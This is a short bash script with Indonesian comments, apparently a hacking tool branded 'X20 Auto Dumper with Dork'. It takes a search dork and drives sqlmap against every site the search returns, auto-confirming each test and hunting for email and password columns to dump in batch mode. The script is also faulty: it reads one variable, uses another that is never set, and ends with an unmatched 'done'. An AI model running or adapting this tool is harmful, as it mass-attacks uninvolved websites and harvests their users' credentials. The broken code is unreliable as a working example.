#!/bin/bash 
# Jika Ingin Rec0de, Harap Jangan Mengganti Copyright Nya
# Hargailah Pembuat moduless ini
clear
#banner
 echo -e """\e[31m

██╗  ██╗██████╗  ██████╗ 
╚██╗██╔╝╚════██╗██╔═████╗
 ╚███╔╝  █████╔╝██║██╔██║
 ██╔██╗ ██╔═══╝ ████╔╝██║
██╔╝ ██╗███████╗╚██████╔╝
╚═╝  ╚═╝╚══════╝ ╚═════╝ 
                         ██████╗ ██╗   ██╗███╗   ███╗██████╗ ███████╗██████╗ 
                         ██╔══██╗██║   ██║████╗ ████║██╔══██╗██╔════╝██╔══██╗
                         ██║  ██║██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
                         ██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗
                         ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║     ███████╗██║  ██║
                         ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝  
  * POWERED BY SQLMap *               ╔───────────────────────────────────╗
                                      |    * X20 Auto Dumper with Dork *  |
                                      ╠───────────────────────────────────╣  
                    ╔───────────────────────────────────╗
                    |   * Author By Yoshieichiro_01 *   |
                    ╠───────────────────────────────────╣                            
         
\e[0m\e[0m"""                                                    
echo -e " \e[33m"
echo " ╔──────────────────────────╗ "
echo " | Masukkan Dork Mu Bro !!  | "
echo " ╠──────────────────────────╣ "
read LIST
python2 sqlmap/sqlmap.py -g $DORK --answer="do you want to test this URL?=y" --random-agent --ignore-proxy --ignore-redirects --timeout=10 --output-dir="dump1" --keep-alive --threads=10 --answer="hashes=N, crack=N" --search -C mail,pass --batch 
done